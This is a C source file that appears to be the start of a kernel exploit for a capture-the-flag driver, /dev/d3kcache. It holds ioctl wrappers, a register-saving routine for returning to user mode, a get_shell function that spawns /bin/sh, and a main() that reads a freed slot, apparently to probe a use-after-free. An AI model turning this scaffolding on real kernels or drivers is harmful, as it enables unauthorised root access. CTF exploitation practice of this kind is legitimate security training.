// author: @eastXueLian
// usage : musl-gcc ./exp.c -static -masm=intel -o ./rootfs/exp

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#define lg(X) printf("\033[1;31;40m[*] %s --> 0x%lx \033[0m\n", (#X), (X))

struct NODE{
    int idx;
    int size;
    char *tosave_buf;
};

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status() {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
    );
    puts("[*]status has been saved.");
}
void get_shell(void) {
    system("/bin/sh");
}

void allocate_d3(int fd, int idx, int size, char *buf_ptr) {
    struct NODE *node = (struct NODE*)malloc(0x10);
    node->idx = idx;
    node->size = size;
    node->tosave_buf = buf_ptr;
    ioctl(fd, 0x114, node);
}
void write_d3(int fd, int idx, int size, char *buf_ptr) {
    struct NODE *node = (struct NODE*)malloc(0x10);
    node->idx = idx;
    node->size = size;
    node->tosave_buf = buf_ptr;
    ioctl(fd, 0x514, node);
}
void read_d3(int fd, int idx, int size, char *tosave_buf) {
    struct NODE *node = (struct NODE*)malloc(0x10);
    node->idx = idx;
    node->size = size;
    node->tosave_buf = tosave_buf;
    ioctl(fd, 0x1919, node);
}
void release_d3(int fd, int idx) {
    struct NODE *node = (struct NODE*)malloc(0x10);
    node->idx = idx;
    ioctl(fd, 0x810, node);
}

int main() {

    int fd = open("/dev/d3kcache", 2);
    char buf[0x100];

    strcpy(buf, "HELLO testing menu");
    allocate_d3(fd, 2, 0x50, buf);
    puts(buf);
    write_d3(fd, 2, 0x10, buf);
    read_d3(fd, 2, 0x100, buf);
    puts(buf);
    release_d3(fd, 2);
    read_d3(fd, 2, 0x100, buf);
    puts(buf);

    return 0;
}
